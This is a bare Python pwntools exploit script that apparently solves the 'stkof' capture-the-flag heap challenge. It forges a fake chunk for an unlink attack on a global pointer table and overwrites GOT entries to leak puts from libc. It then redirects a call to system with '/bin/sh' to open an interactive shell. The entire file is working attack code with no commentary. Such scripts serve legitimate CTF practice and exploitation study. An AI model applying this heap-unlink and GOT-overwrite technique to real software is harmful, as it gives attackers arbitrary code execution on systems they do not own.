from pwn import * 
p=process("./stkof")
libc=ELF("./libc.so.6")

def add(size):
    p.sendline("1")
    p.sendline(str(size))
    p.recvuntil('OK\n')

def edit(index,size,content):
    p.sendline("2")
    p.sendline(str(index))
    p.sendline(str(size))
    p.send(content)
    p.recvuntil('OK\n')
    
def delete(index):
    p.sendline("3")
    p.sendline(str(index))

if __name__=="__main__":
    record=0x602140
    add(0x100)
    add(0x40)
    add(0x80)
    payload=p64(0)
    payload+=p64(0x20)
    payload+=p64(record+16-0x18)
    payload+=p64(record+16-0x10)
    payload+=p64(0x20)# dont forget small chunk have a size flag here to check
    payload=payload.ljust(0x40,'a')
    payload+=p64(0x40)
    payload+=p64(0x90)
    edit(2,len(payload),payload)
    delete(3)
    p.recvuntil("OK\n")
    payload2='a'*8+p64(0x602018)+p64(0x602020)+p64(0x602088)
    edit(2,len(payload2),payload2)
    payload3=p64(0x400760)
    edit(0,len(payload3),payload3)
    delete(1)
    puts_addr = p.recvuntil('\nOK\n', drop=True).ljust(8, '\x00')
    puts_addr = u64(puts_addr)
    libc_base = puts_addr - libc.symbols['puts']
    binsh_addr = libc_base + next(libc.search('/bin/sh'))
    system_addr = libc_base + libc.symbols['system']
    payload4 = p64(system_addr)
    edit(2, len(payload4), payload4)
    p.send(p64(binsh_addr))
    p.interactive()